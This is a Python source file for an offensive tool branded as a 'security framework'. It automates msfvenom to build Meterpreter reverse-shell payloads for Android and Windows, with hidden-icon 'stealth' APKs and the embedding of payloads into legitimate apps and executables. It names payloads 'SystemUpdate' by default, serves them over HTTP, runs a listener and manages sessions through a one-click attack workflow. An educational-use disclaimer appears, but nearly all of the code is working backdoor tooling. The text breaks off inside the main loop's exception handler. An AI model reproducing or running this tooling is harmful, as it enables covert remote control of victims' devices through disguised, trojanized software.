#!/usr/bin/env python3
"""
██╗    ██╗ █████╗  ██████╗  █████╗ ███████╗
██║    ██║██╔══██╗██╔═══╝██╔══██╗██╔════╝
██║ █╗ ██║███████║██║   ██║███████║███████╗
██║███╗██║██╔══██║██║   ██║██╔══██║╚════██║
╚███╔███╔╝██║  ██║╚██████╔╝██║  ██║███████║
 ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝

        ⚡ SOFTWARE ENGINEER • AI • CYBER SECURITY ⚡
               Advanced Multi-Platform Security Framework
                     Version 4.0 | Ultra Premium
               Author: WAQAS Security Researcher

    DISCLAIMER: For EDUCATIONAL PURPOSES ONLY.
    Use ONLY on devices you OWN or have EXPLICIT WRITTEN PERMISSION
    to test in a controlled environment.
"""

import os
import sys
import subprocess
import platform
import socket
import shutil
import time
import logging
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# ==========================================
# PREMIUM LOGGING CONFIGURATION
# ==========================================
LOG_FILE = "waqas_framework.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE, encoding="utf-8"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("WAQAS-Premium")

# ==========================================
# SMART ERROR HANDLER MODULE
# ==========================================
def handle_error(e, context="Operation"):
    """Smartly formats and handles errors, suggesting fixes."""
    err_str = str(e).lower()
    print(f"\n{Fore.RED}{Style.BRIGHT}╔════════════════════════════════════════════════════════════╗")
    print(f"║ ⚠️  SMART ERROR DETECTED                                   ║")
    print(f"╠════════════════════════════════════════════════════════════╣")
    print(f"║ Context : {context[:46]:<46} ║")
    print(f"║ Error   : {str(e)[:46]:<46} ║")
    print(f"╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    if "not found" in err_str or "command not found" in err_str:
        print(f"{Fore.YELLOW}[!] Suggestion: Missing dependency. Framework will attempt auto-install on next launch.{Fore.WHITE}")
    elif "apktool" in err_str:
        print(f"{Fore.YELLOW}[!] Suggestion: Outdated Apktool. Please run 'sudo bash install.sh' to update to v2.9.3.{Fore.WHITE}")
    elif "stageless" in err_str or "injection" in err_str:
        print(f"{Fore.YELLOW}[!] Suggestion: msfvenom cannot inject stageless payloads. Framework handles this automatically.{Fore.WHITE}")
    elif "permission denied" in err_str:
        print(f"{Fore.YELLOW}[!] Suggestion: Run the framework as root: 'sudo python3 waqas_android_framework.py'{Fore.WHITE}")
    
    logger.error(f"{context} failed: {e}")

# ==========================================
# DISCLAIMER MODULE
# ==========================================
DISCLAIMER_TEXT = f"""
{Fore.RED}{Style.BRIGHT}
╔════════════════════════════════════════════════════════════════════════════╗
║                         ⚠️  LEGAL DISCLAIMER  ⚠️                            ║
╠════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  This software is provided by WAQAS Security Researcher STRICTLY for         ║
║  EDUCATIONAL and RESEARCH purposes only.                                     ║
║                                                                              ║
║  By using this tool, you AGREE and ACKNOWLEDGE that:                         ║
║                                                                              ║
║  1. You will ONLY test devices you OWN or have EXPLICIT WRITTEN              ║
║     PERMISSION to test.                                                      ║
║  2. You will operate ONLY in controlled, isolated research                   ║
║     environments (lab, VM, dedicated test devices).                          ║
║  3. You will NOT use this tool against any device, network, or               ║
║     individual without proper authorization.                                 ║
║  4. Unauthorized access to computer systems is ILLEGAL under                 ║
║     international cybercrime laws (e.g., CFAA, CMA, IT Act, etc.).          ║
║  5. The author (WAQAS Security Researcher) is NOT responsible for            ║
║     any misuse, damage, or legal consequences arising from the use           ║
║     of this tool.                                                            ║
║  6. All activity is logged locally for audit and accountability.             ║
║                                                                              ║
║  If you do NOT agree with these terms, EXIT the program immediately.         ║
║                                                                              ║
╚════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

def show_disclaimer():
    """Display the disclaimer and require user acknowledgment."""
    print(DISCLAIMER_TEXT)
    while True:
        response = input(f"{Fore.GREEN}{Style.BRIGHT}[?] Do you understand and AGREE to these terms? (yes/no): {Fore.WHITE}").strip().lower()
        if response in ("yes", "y"):
            logger.info("User accepted disclaimer terms.")
            print(f"\n{Fore.GREEN}{Style.BRIGHT}[+] Disclaimer accepted. Proceeding with caution...{Fore.WHITE}\n")
            time.sleep(1)
            return True
        elif response in ("no", "n"):
            logger.warning("User declined disclaimer. Exiting.")
            print(f"\n{Fore.RED}{Style.BRIGHT}[!] You must accept the disclaimer to use this tool.{Fore.WHITE}")
            sys.exit(0)
        else:
            print(f"{Fore.RED}{Style.BRIGHT}[-] Please type 'yes' or 'no'.{Fore.WHITE}")

# ==========================================
# UTILITY FUNCTIONS
# ==========================================
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def check_tool(tool):
    try:
        subprocess.run(["which", tool], capture_output=True, check=True)
        return f"{Fore.GREEN}✓ Installed{Fore.WHITE}"
    except Exception:
        return f"{Fore.RED}✗ Missing{Fore.WHITE}"

def print_progress_bar(duration, prefix="Working", suffix="Complete"):
    bar_length = 30
    for i in range(duration + 1):
        percent = float(i) / duration
        arrow = "█" * int(round(percent * bar_length))
        spaces = "░" * (bar_length - len(arrow))
        sys.stdout.write(f"\r{Fore.YELLOW}{Style.BRIGHT}[{prefix}] |{Fore.CYAN}{arrow}{spaces}{Fore.YELLOW}| {int(percent * 100)}% {suffix}{Fore.WHITE}")
        sys.stdout.flush()
        time.sleep(0.05)
    print()

def check_and_install_dependencies():
    """Auto-check and install missing system dependencies."""
    tools = ["msfvenom", "keytool", "apksigner", "zipalign", "apktool"]
    missing = [t for t in tools if shutil.which(t) is None]
    
    if not missing:
        return True
        
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}[!] Missing dependencies detected: {', '.join(missing)}{Fore.WHITE}")
    resp = input(f"{Fore.GREEN}{Style.BRIGHT}[?] Attempt automatic installation? (y/n): {Fore.WHITE}").lower()
    
    if resp == 'y':
        print(f"{Fore.CYAN}{Style.BRIGHT}[*] Updating apt and installing... (This may take a minute){Fore.WHITE}")
        subprocess.run(["apt-get", "update"], check=False)
        subprocess.run(["apt-get", "install", "-y", "metasploit-framework", "default-jdk", "apksigner", "zipalign", "apktool"], check=False)
        
        still_missing = [t for t in tools if shutil.which(t) is None]
        if still_missing:
            print(f"{Fore.RED}{Style.BRIGHT}[!] Failed to install: {', '.join(still_missing)}. Please install manually.{Fore.WHITE}")
            return False
        print(f"{Fore.GREEN}{Style.BRIGHT}[+] All dependencies installed successfully!{Fore.WHITE}")
        return True
    else:
        print(f"{Fore.RED}{Style.BRIGHT}[!] Dependencies are required. Exiting.{Fore.WHITE}")
        return False

def run_cmd(cmd, timeout=300):
    """Smart subprocess runner that captures errors cleanly."""
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        if result.returncode != 0:
            err_msg = result.stderr.strip().split('\n')[-1] if result.stderr else "Unknown error"
            return False, err_msg
        return True, result.stdout
    except subprocess.TimeoutExpired:
        return False, "Command timed out."
    except Exception as e:
        return False, str(e)

# ==========================================
# PAYLOAD BUILDER CLASS
# ==========================================
class PayloadBuilder:
    def __init__(self, lhost, lport, payload_name):
        self.lhost = lhost
        self.lport = lport
        self.payload_name = payload_name

    def build_android(self):
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Building Android standalone payloads for {self.lhost}:{self.lport}{Fore.WHITE}")
        logger.info(f"Building Android standalone payload → {self.lhost}:{self.lport} | name={self.payload_name}")

        if not os.path.exists("debug.keystore"):
            self.create_keystore()

        success = False
        if self.create_android_payload(stealth=False):
            success = True
        self.create_android_payload(stealth=True)
        return success

    def build_windows(self):
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Building Windows standalone payload for {self.lhost}:{self.lport}{Fore.WHITE}")
        logger.info(f"Building Windows standalone payload → {self.lhost}:{self.lport} | name={self.payload_name}")

        name = f"{self.payload_name}_win"
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Creating Windows EXE payload...{Fore.WHITE}")
        
        cmd = [
            "msfvenom",
            "-p", "windows/meterpreter_reverse_tcp",
            f"LHOST={self.lhost}",
            f"LPORT={self.lport}",
            "-f", "exe",
            "-o", f"{name}.exe"
        ]

        success, err = run_cmd(cmd)
        if success and os.path.exists(f"{name}.exe"):
            size = os.path.getsize(f"{name}.exe") / 1024
            print(f"{Fore.GREEN}{Style.BRIGHT}  ✓ Windows EXE created: {name}.exe ({size:.1f} KB){Fore.WHITE}")
            logger.info(f"Windows EXE built: {name}.exe ({size:.1f} KB)")
            return True
        else:
            handle_error(err, "Windows EXE Generation")
            return False

    def embed_android_payload(self, original_apk):
        """Embed payload into a legitimate APK"""
        if not os.path.exists(original_apk):
            handle_error(f"File not found: {original_apk}", "Android APK Embed")
            return False
            
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Embedding payload into {original_apk}...{Fore.WHITE}")
        logger.info(f"Embedding payload into {original_apk} for {self.lhost}:{self.lport}")
        
        name = f"{self.payload_name}_embedded"
        cmd = [
            "msfvenom",
            "-x", original_apk,
            "-p", "android/meterpreter/reverse_tcp",
            f"LHOST={self.lhost}",
            f"LPORT={self.lport}",
            "-a", "dalvik",
            "--platform", "android",
            "-o", f"{name}.apk"
        ]
        
        success, err = run_cmd(cmd)
        if success and os.path.exists(f"{name}.apk"):
            size = os.path.getsize(f"{name}.apk") / 1024
            print(f"{Fore.GREEN}{Style.BRIGHT}  ✓ Embedded APK created: {name}.apk ({size:.1f} KB){Fore.WHITE}")
            logger.info(f"Embedded APK built: {name}.apk ({size:.1f} KB)")
            self.sign_apk(name)
            return True
        else:
            handle_error(err, "Android APK Embed")
            print(f"{Fore.YELLOW}  [!] Note: msfvenom cannot inject into heavily obfuscated or non-standard APKs.{Fore.WHITE}")
            return False

    def embed_windows_payload(self, original_exe):
        """Embed payload into a legitimate Windows EXE"""
        if not os.path.exists(original_exe):
            handle_error(f"File not found: {original_exe}", "Windows EXE Embed")
            return False
            
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Embedding payload into {original_exe}...{Fore.WHITE}")
        logger.info(f"Embedding payload into {original_exe} for {self.lhost}:{self.lport}")
        
        name = f"{self.payload_name}_win_embedded"
        cmd = [
            "msfvenom",
            "-x", original_exe,
            "-k",
            "-p", "windows/meterpreter/reverse_tcp",
            f"LHOST={self.lhost}",
            f"LPORT={self.lport}",
            "-f", "exe",
            "-a", "x86",
            "--platform", "windows",
            "-o", f"{name}.exe"
        ]
        
        success, err = run_cmd(cmd)
        if success and os.path.exists(f"{name}.exe"):
            size = os.path.getsize(f"{name}.exe") / 1024
            print(f"{Fore.GREEN}{Style.BRIGHT}  ✓ Embedded EXE created: {name}.exe ({size:.1f} KB){Fore.WHITE}")
            logger.info(f"Embedded EXE built: {name}.exe ({size:.1f} KB)")
            return True
        else:
            handle_error(err, "Windows EXE Embed")
            print(f"{Fore.YELLOW}  [!] Note: msfvenom cannot inject into heavily packed/obfuscated EXEs.{Fore.WHITE}")
            return False

    def create_keystore(self):
        print(f"{Fore.YELLOW}{Style.BRIGHT}[+] Creating keystore...{Fore.WHITE}")
        subprocess.run([
            "keytool", "-genkey", "-v", "-keystore", "debug.keystore",
            "-alias", "androiddebugkey", "-keyalg", "RSA", "-keysize", "2048",
            "-validity", "10000", "-storepass", "android", "-keypass", "android",
            "-dname", "CN=Android Debug, O=Android, C=US"
        ], capture_output=True)
        logger.info("Keystore created.")

    def create_android_payload(self, stealth=False):
        name = f"{self.payload_name}_stealth" if stealth else self.payload_name
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Creating Android {'Stealth' if stealth else 'Normal'} payload...{Fore.WHITE}")

        cmd = [
            "msfvenom",
            "-p", "android/meterpreter_reverse_tcp",
            f"LHOST={self.lhost}",
            f"LPORT={self.lport}",
            "AndroidWakeLock=true",
            "AndroidMeterpreterSkipUI=true",
        ]

        if stealth:
            cmd += ["AndroidHideAppIcon=true"]
            
        cmd += ["-o", f"{name}.apk"]

        success, err = run_cmd(cmd)
        if success and os.path.exists(f"{name}.apk"):
            size = os.path.getsize(f"{name}.apk") / 1024
            print(f"{Fore.GREEN}{Style.BRIGHT}  ✓ APK created: {name}.apk ({size:.1f} KB){Fore.WHITE}")
            logger.info(f"APK built: {name}.apk ({size:.1f} KB)")
            self.sign_apk(name)
            return True
        else:
            handle_error(err, "Android Payload Gen")
            return False

    def sign_apk(self, name):
        print(f"{Fore.YELLOW}{Style.BRIGHT}  [+] Signing APK...{Fore.WHITE}")
        apk_file = f"{name}.apk"
        final_name = f"{name}_final.apk"
        aligned = f"{name}_aligned.apk"

        subprocess.run(["zipalign", "-v", "4", apk_file, aligned], capture_output=True)
        subprocess.run([
            "apksigner", "sign", "--ks", "debug.keystore",
            "--ks-pass", "pass:android", "--key-pass", "pass:android",
            "--out", final_name, aligned
        ], capture_output=True)

        if os.path.exists(aligned): os.remove(aligned)

        if os.path.exists(final_name):
            print(f"{Fore.GREEN}{Style.BRIGHT}  ✓ Signed: {final_name}{Fore.WHITE}")
        else:
            subprocess.run([
                "jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
                "-keystore", "debug.keystore", "-storepass", "android",
                "-keypass", "android", apk_file, "androiddebugkey"
            ], capture_output=True)
            shutil.copy(apk_file, final_name)
            print(f"{Fore.GREEN}{Style.BRIGHT}  ✓ Signed (fallback): {final_name}{Fore.WHITE}")

# ==========================================
# MAIN FRAMEWORK CLASS
# ==========================================
class WaqasSecurityFramework:
    def __init__(self):
        self.version = "4.0"
        self.author = "WAQAS Security Researcher"
        self.kali_ip = get_local_ip()
        self.port = 4444
        self.payload_name = "SystemUpdate"
        self.start_time = datetime.now()
        self.clear_screen()

    def clear_screen(self):
        os.system('clear' if platform.system() != 'Windows' else 'cls')

    def print_banner(self):
        banner = f"""
{Fore.RED}{Style.BRIGHT}
██╗    ██╗ █████╗  ██████╗  █████╗ ███████╗
██║    ██║██╔══██╗██╔═══╝██╔══██╗██╔════╝
██║ █╗ ██║███████║██║   ██║███████║███████╗
██║███╗██║██╔══██║██║   ██║██╔══██║╚════██║
╚███╔███╔╝██║  ██║╚██████╔╝██║  ██║███████║
 ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝

        ⚡ SOFTWARE ENGINEER • AI • CYBER SECURITY ⚡
            Advanced Multi-Platform Security Framework                  
                     Version {self.version} | Ultra Premium                  
               Author: {self.author}               
{Style.RESET_ALL}
        """
        print(banner)

    def print_status_bar(self):
        uptime = datetime.now() - self.start_time
        hours, remainder = divmod(int(uptime.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        print(f"{Fore.CYAN}{Style.BRIGHT}[STATUS] {Fore.WHITE}Uptime: {Fore.YELLOW}{hours:02d}:{minutes:02d}:{seconds:02d}{Fore.CYAN} | {Fore.WHITE}Log: {Fore.YELLOW}{LOG_FILE}{Fore.CYAN} | {Fore.WHITE}Date: {Fore.YELLOW}{datetime.now().strftime('%Y-%m-%d %H:%M')}{Fore.WHITE}")

    def print_menu(self):
        menu = f"""
{Fore.CYAN}{Style.BRIGHT}═══════════════════════════════════════════════════════════════════════════════
{Fore.YELLOW}                           ULTRA PREMIUM MENU (v4.0)
{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════════
{Fore.MAGENTA}  [ ANDROID OPERATIONS ]{Fore.WHITE}
{Fore.GREEN}[{Fore.WHITE}1{Fore.GREEN}] {Fore.WHITE}Generate Android Payload        {Fore.YELLOW}→ Create Normal + Stealth APK
{Fore.GREEN}[{Fore.WHITE}2{Fore.GREEN}] {Fore.WHITE}Embed Payload into APK          {Fore.YELLOW}→ Backdoor Android App

{Fore.MAGENTA}  [ WINDOWS OPERATIONS ]{Fore.WHITE}
{Fore.GREEN}[{Fore.WHITE}3{Fore.GREEN}] {Fore.WHITE}Generate Windows Payload        {Fore.YELLOW}→ Create Standalone EXE
{Fore.GREEN}[{Fore.WHITE}4{Fore.GREEN}] {Fore.WHITE}Embed Payload into EXE          {Fore.YELLOW}→ Backdoor Windows App

{Fore.MAGENTA}  [ EXPLOITATION & LISTENER ]{Fore.WHITE}
{Fore.GREEN}[{Fore.WHITE}5{Fore.GREEN}] {Fore.WHITE}Start Listener                  {Fore.YELLOW}→ Start Multi-Platform Handler
{Fore.GREEN}[{Fore.WHITE}6{Fore.GREEN}] {Fore.WHITE}Start HTTP Server               {Fore.YELLOW}→ Share Payloads via browser
{Fore.GREEN}[{Fore.WHITE}7{Fore.GREEN}] {Fore.WHITE}Check Active Sessions           {Fore.YELLOW}→ List connected devices
{Fore.GREEN}[{Fore.WHITE}8{Fore.GREEN}] {Fore.WHITE}Interact with Session           {Fore.YELLOW}→ Connect to device

{Fore.MAGENTA}  [ AUTOMATION & SETTINGS ]{Fore.WHITE}
{Fore.GREEN}[{Fore.WHITE}9{Fore.GREEN}] {Fore.WHITE}Automated Attack (1-Click)      {Fore.YELLOW}→ Generate + Serve + Listen
{Fore.GREEN}[{Fore.WHITE}10{Fore.GREEN}] {Fore.WHITE}Change Settings                 {Fore.YELLOW}→ Configure IP/Port/Name
{Fore.GREEN}[{Fore.WHITE}11{Fore.GREEN}] {Fore.WHITE}System Info & Dependencies      {Fore.YELLOW}→ Display tool status
{Fore.GREEN}[{Fore.WHITE}12{Fore.GREEN}] {Fore.WHITE}View Disclaimer                 {Fore.YELLOW}→ Display legal terms
{Fore.GREEN}[{Fore.WHITE}13{Fore.GREEN}] {Fore.WHITE}Clear Screen                    {Fore.YELLOW}→ Clear terminal
{Fore.GREEN}[{Fore.WHITE}14{Fore.GREEN}] {Fore.WHITE}Exit                            {Fore.YELLOW}→ Close framework safely

{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════════
{Fore.GREEN}[{Fore.WHITE}Current Settings{Fore.GREEN}] LHOST: {Fore.YELLOW}{self.kali_ip}{Fore.GREEN} | LPORT: {Fore.YELLOW}{self.port}{Fore.GREEN} | Payload: {Fore.YELLOW}{self.payload_name}
{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════════
        """
        print(menu)
        self.print_status_bar()

    # --- PAYLOAD ACTIONS ---
    def generate_android(self):
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Generating Android standalone payloads...{Fore.WHITE}\n")
        print_progress_bar(10, prefix="Initializing", suffix="Ready")
        builder = PayloadBuilder(self.kali_ip, self.port, self.payload_name)
        builder.build_android()

    def embed_android(self):
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Android APK Embedding Feature{Fore.WHITE}")
        original_apk = input(f"{Fore.GREEN}{Style.BRIGHT}[?] Enter path to legitimate APK (e.g., app.apk): {Fore.WHITE}").strip()
        if not original_apk:
            print(f"{Fore.RED}{Style.BRIGHT}[-] No path provided.{Fore.WHITE}")
            return
        builder = PayloadBuilder(self.kali_ip, self.port, self.payload_name)
        builder.embed_android_payload(original_apk)

    def generate_windows(self):
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Generating Windows standalone payload...{Fore.WHITE}\n")
        print_progress_bar(10, prefix="Initializing", suffix="Ready")
        builder = PayloadBuilder(self.kali_ip, self.port, self.payload_name)
        builder.build_windows()

    def embed_windows(self):
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Windows EXE Embedding Feature{Fore.WHITE}")
        original_exe = input(f"{Fore.GREEN}{Style.BRIGHT}[?] Enter path to legitimate EXE (e.g., app.exe): {Fore.WHITE}").strip()
        if not original_exe:
            print(f"{Fore.RED}{Style.BRIGHT}[-] No path provided.{Fore.WHITE}")
            return
        builder = PayloadBuilder(self.kali_ip, self.port, self.payload_name)
        builder.embed_windows_payload(original_exe)

    # --- LISTENER & SESSIONS ---
    def start_listener(self, payload_type="android_standalone"):
        """Start Metasploit listener. Handles Android and Windows (Standalone & Embedded)."""
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Starting Metasploit listener...{Fore.WHITE}\n")
        
        if payload_type == "android_embedded":
            payload_name = "android/meterpreter/reverse_tcp"
            print(f"{Fore.CYAN}[*] Listener configured for ANDROID EMBEDDED (Staged) payload.{Fore.WHITE}")
        elif payload_type == "windows_standalone":
            payload_name = "windows/meterpreter_reverse_tcp"
            print(f"{Fore.CYAN}[*] Listener configured for WINDOWS STANDALONE (Stageless) payload.{Fore.WHITE}")
        elif payload_type == "windows_embedded":
            payload_name = "windows/meterpreter/reverse_tcp"
            print(f"{Fore.CYAN}[*] Listener configured for WINDOWS EMBEDDED (Staged) payload.{Fore.WHITE}")
        else: # android_standalone
            payload_name = "android/meterpreter_reverse_tcp"
            print(f"{Fore.CYAN}[*] Listener configured for ANDROID STANDALONE (Stageless) payload.{Fore.WHITE}")

        logger.info(f"Listener started → {self.kali_ip}:{self.port} (Type: {payload_type})")
        cmd = f"""msfconsole -q -x "use exploit/multi/handler; set payload {payload_name}; set LHOST {self.kali_ip}; set LPORT {self.port}; set ExitOnSession false; exploit -j -z" """
        os.system(cmd)

    def listener_menu(self):
        print(f"\n{Fore.YELLOW}[?] Which payload type are you listening for?")
        print(f"{Fore.GREEN}1{Fore.WHITE}) Android Standalone (Generated via Option 1)")
        print(f"{Fore.GREEN}2{Fore.WHITE}) Android Embedded (Generated via Option 2)")
        print(f"{Fore.GREEN}3{Fore.WHITE}) Windows Standalone (Generated via Option 3)")
        print(f"{Fore.GREEN}4{Fore.WHITE}) Windows Embedded (Generated via Option 4)")
        l_choice = input(f"{Fore.GREEN}[?] Select (1-4): {Fore.WHITE}").strip()
        
        if l_choice == "2":
            self.start_listener(payload_type="android_embedded")
        elif l_choice == "3":
            self.start_listener(payload_type="windows_standalone")
        elif l_choice == "4":
            self.start_listener(payload_type="windows_embedded")
        else:
            self.start_listener(payload_type="android_standalone")

    def start_http_server(self):
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Starting HTTP server on port 8000...{Fore.WHITE}")
        print(f"{Fore.CYAN}[*] Available files in directory will be served.{Fore.WHITE}")
        if os.path.exists(f"{self.payload_name}_final.apk") or os.path.exists(f"{self.payload_name}_win.exe"):
            print(f"{Fore.GREEN}[+] Payload(s) ready in current directory.{Fore.WHITE}")
            logger.info(f"HTTP server started → port 8000")
            os.system(f"python3 -m http.server 8000")
        else:
            print(f"{Fore.RED}[-] No payloads found. Generate them first.{Fore.WHITE}")

    def check_sessions(self):
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Checking active sessions...{Fore.WHITE}\n")
        os.system("msfconsole -q -x 'sessions -l; exit'")

    def interactive_session(self):
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Starting interactive session...{Fore.WHITE}\n")
        session_id = input(f"{Fore.GREEN}{Style.BRIGHT}[?] Enter session ID (or press Enter for list): {Fore.WHITE}")
        if not session_id:
            self.check_sessions()
            session_id = input(f"\n{Fore.GREEN}{Style.BRIGHT}[?] Enter session ID: {Fore.WHITE}")
        if session_id:
            os.system(f"msfconsole -q -x 'sessions -i {session_id}'")
        else:
            print(f"{Fore.RED}{Style.BRIGHT}[-] No session ID provided{Fore.WHITE}")

    # --- AUTOMATION ---
    def automated_attack(self):
        """1-Click Automated Attack: Generate, Serve in background, and Listen."""
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Starting 1-Click Automated Attack Workflow...{Fore.WHITE}")
        
        print(f"\n{Fore.CYAN}[?] Select Target Platform:")
        print(f"{Fore.GREEN}1{Fore.WHITE}) Android (Standalone APK)")
        print(f"{Fore.GREEN}2{Fore.WHITE}) Windows (Standalone EXE)")
        os_choice = input(f"{Fore.GREEN}[?] Select (1/2): {Fore.WHITE}").strip()
        
        if os_choice == "2":
            print(f"\n{Fore.CYAN}{Style.BRIGHT}[STEP 1/3] Generating Windows Standalone Payload...{Fore.WHITE}")
            builder = PayloadBuilder(self.kali_ip, self.port, self.payload_name)
            if not builder.build_windows():
                print(f"{Fore.RED}{Style.BRIGHT}[!] Automated attack aborted.{Fore.WHITE}")
                return
            apk_path = f"{self.payload_name}_win.exe"
            p_type = "windows_standalone"
        else:
            print(f"\n{Fore.CYAN}{Style.BRIGHT}[STEP 1/3] Generating Android Standalone Payload...{Fore.WHITE}")
            builder = PayloadBuilder(self.kali_ip, self.port, self.payload_name)
            if not builder.build_android():
                print(f"{Fore.RED}{Style.BRIGHT}[!] Automated attack aborted.{Fore.WHITE}")
                return
            apk_path = f"{self.payload_name}_final.apk"
            p_type = "android_standalone"
            
        print(f"\n{Fore.CYAN}{Style.BRIGHT}[STEP 2/3] Starting HTTP Server in background...{Fore.WHITE}")
        print(f"{Fore.GREEN}{Style.BRIGHT}[+] URL: http://{self.kali_ip}:8000/{apk_path}{Fore.WHITE}")
        http_process = subprocess.Popen(["python3", "-m", "http.server", "8000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        logger.info(f"HTTP server started in background (PID: {http_process.pid})")
        
        print(f"\n{Fore.CYAN}{Style.BRIGHT}[STEP 3/3] Starting Listener...{Fore.WHITE}")
        print(f"{Fore.YELLOW}{Style.BRIGHT}[!] Waiting for connection... Press Ctrl+C to stop.{Fore.WHITE}")
        try:
            self.start_listener(payload_type=p_type)
        except KeyboardInterrupt:
            pass
        finally:
            print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Stopping background HTTP server...{Fore.WHITE}")
            http_process.terminate()
            logger.info("HTTP server stopped.")

    # --- SETTINGS & INFO ---
    def change_settings(self):
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Current Settings:{Fore.WHITE}")
        print(f"  LHOST   : {self.kali_ip}")
        print(f"  LPORT   : {self.port}")
        print(f"  Payload : {self.payload_name}\n")
        
        new_ip = input(f"{Fore.GREEN}{Style.BRIGHT}[?] New LHOST (Enter to keep {self.kali_ip}): {Fore.WHITE}")
        if new_ip: self.kali_ip = new_ip
            
        new_port = input(f"{Fore.GREEN}{Style.BRIGHT}[?] New LPORT (Enter to keep {self.port}): {Fore.WHITE}")
        if new_port:
            try: self.port = int(new_port)
            except ValueError: print(f"{Fore.RED}{Style.BRIGHT}[-] Invalid port.{Fore.WHITE}")
                
        new_name = input(f"{Fore.GREEN}{Style.BRIGHT}[?] New Payload Name (Enter to keep {self.payload_name}): {Fore.WHITE}")
        if new_name: self.payload_name = new_name
            
        print(f"\n{Fore.GREEN}{Style.BRIGHT}[+] Settings updated!{Fore.WHITE}")

    def show_info(self):
        info = f"""
{Fore.CYAN}{Style.BRIGHT}═══════════════════════════════════════════════════════════════════════════════
{Fore.YELLOW}                         SYSTEM INFORMATION
{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════════

{Fore.GREEN}Tool Information:{Fore.WHITE}
  Name         : WAQAS Multi-Platform Security Framework
  Version      : {self.version} (Ultra Premium)
  Author       : {self.author}
  Log File     : {LOG_FILE}

{Fore.GREEN}Network Information:{Fore.WHITE}
  Local IP     : {self.kali_ip}
  Listener Port: {self.port}
  Payload Name : {self.payload_name}

{Fore.GREEN}System Information:{Fore.WHITE}
  OS           : {platform.system()} {platform.release()}
  Python       : {sys.version.split()[0]}
  Hostname     : {platform.node()}

{Fore.GREEN}Required Tools:{Fore.WHITE}
  msfvenom     : {check_tool('msfvenom')}
  keytool      : {check_tool('keytool')}
  apksigner    : {check_tool('apksigner')}
  zipalign     : {check_tool('zipalign')}
  apktool      : {check_tool('apktool')}

{Fore.GREEN}Features:{Fore.WHITE}
  ✓ Android Standalone Payload Gen (Normal + Stealth)
  ✓ Android APK Embedding / Backdooring
  ✓ Windows Standalone EXE Generation
  ✓ Windows EXE Embedding / Backdooring
  ✓ Multi-Platform Listener Configuration
  ✓ 1-Click Automated Attack Workflow (Android/Windows)
  ✓ Smart Auto-Error Handler & Fixer
  ✓ Auto-Dependency Installer
  ✓ Local Audit Logging

{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════════
        """
        print(info)

    # --- MAIN LOOP ---
    def run(self):
        self.clear_screen()
        self.print_banner()
        show_disclaimer()
        
        if not check_and_install_dependencies():
            sys.exit(1)
            
        self.clear_screen()
        self.print_banner()

        while True:
            try:
                self.print_menu()
                choice = input(f"\n{Fore.GREEN}{Style.BRIGHT}[{Fore.WHITE}WAQAS{Fore.GREEN}]> {Fore.WHITE}").strip()

                if choice == "1": self.generate_android()
                elif choice == "2": self.embed_android()
                elif choice == "3": self.generate_windows()
                elif choice == "4": self.embed_windows()
                elif choice == "5": self.listener_menu()
                elif choice == "6": self.start_http_server()
                elif choice == "7": self.check_sessions()
                elif choice == "8": self.interactive_session()
                elif choice == "9": self.automated_attack()
                elif choice == "10": self.change_settings()
                elif choice == "11": self.show_info()
                elif choice == "12": print(DISCLAIMER_TEXT)
                elif choice == "13": 
                    self.clear_screen()
                    self.print_banner()
                elif choice == "14":
                    print(f"\n{Fore.RED}{Style.BRIGHT}[!] Exiting WAQAS Framework safely...{Fore.WHITE}")
                    logger.info("Framework exited by user.")
                    sys.exit(0)
                elif choice.lower() == "help":
                    print(f"\n{Fore.YELLOW}{Style.BRIGHT}Type a number from 1 to 14 to select an action.{Fore.WHITE}")
                else:
                    print(f"\n{Fore.RED}{Style.BRIGHT}[-] Invalid choice! Select 1-14{Fore.WHITE}")

                input(f"\n{Fore.YELLOW}{Style.BRIGHT}[+] Press Enter to continue...{Fore.WHITE}")
                self.clear_screen()
                self.print_banner()

            except KeyboardInterrupt:
                print(f"\n\n{Fore.RED}{Style.BRIGHT}[!] Interrupted by user{Fore.WHITE}")
                logger.warning("Interrupted by user (Ctrl+C).")
                sys.exit(0)
            except Exception as e:
